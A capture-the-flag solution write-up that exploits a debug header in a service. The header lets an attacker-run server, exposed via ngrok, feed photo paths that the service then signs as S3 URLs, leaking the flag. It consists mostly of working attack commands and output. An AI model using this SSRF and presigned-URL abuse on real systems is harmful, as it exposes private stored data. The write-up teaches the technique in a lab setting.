# Solution

## View the swagger docs

View the swagger docs and find the characters endpoint, and hopefully the commented
out X-Debug header too.

## Hit the characters endpoint

Observe the behavior. It returns both "photo" _and_ "photoURL". Remember the X-Debug
parameter. Play around for a bit and start passing values for that. Notice it's trying
to make a request to whatever you pass:

```bash
➜  ~ curl localhost:8081/characters -H "X-Debug: asdf"                 
unable to make get characters request to service "asdf": Get asdf/characters: unsupported protocol scheme ""
```

## Spin up a server

Spin up an nginx server with just one suspect entry. Expose it to the internet

```bash
mkdir static
curl -Ss localhost:8081/characters | jq "[.[0]]" -M > static/characters
docker run -p 8089:80 -v "$(pwd)/static:/usr/share/nginx/html:ro" --name nginx-solution -d nginx
ngrok http 8089
```

## Point the server at your server

```bash
➜  ~ curl localhost:8081/characters -H "X-Debug: http://f6963781.ngrok.io"
[{"firstName":"Kate","lastName":"Libby","aliases":["Acid Burn"],"photo":"hackers/photos/42842/74b7f996-8b1c-4f16-ab35-4b5e99225347.jpg","photoUrl":"http://localhost:9000/suspects/hackers/photos/42842/74b7f996-8b1c-4f16-ab35-4b5e99225347.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=IL0B9GDKIR7XCKYZWNS6%2F20191010%2Fus-east-1%2Fs3%2Faws4_request\u0026X-Amz-Date=20191010T050215Z\u0026X-Amz-Expires=300\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3d4ae23ee907eac787d37e88c1a051e516159e69956bf4b93e3513e705e095a2"}]
```

Notice that it seems to be using whatever you return in "photo" and signing and setting
photoUrl.

## Think about what you can get it to sign

Play around for a bit. Eventually, get back to looking at the OpenAPI spec and notice
the example value for photo: "20897.jpg". Try returning that. Alternatively, you can return an empty photo, and look at the contents of the entire bucket.

```bash
curl -Ss localhost:8081/characters | jq '[.[0] | .photo = "20897.jpg"]' > static/characters
docker kill nginx-solution && docker rm nginx-solution
docker run -p 8089:80 -v "$(pwd)/static:/usr/share/nginx/html:ro" --name nginx-solution -d nginx
ngrok http 8089
```

## Get it to sign the flag

```bash
curl localhost:8081/characters -H "X-Debug: http://afc70734.ngrok.io"
```

The flag is returned in an image!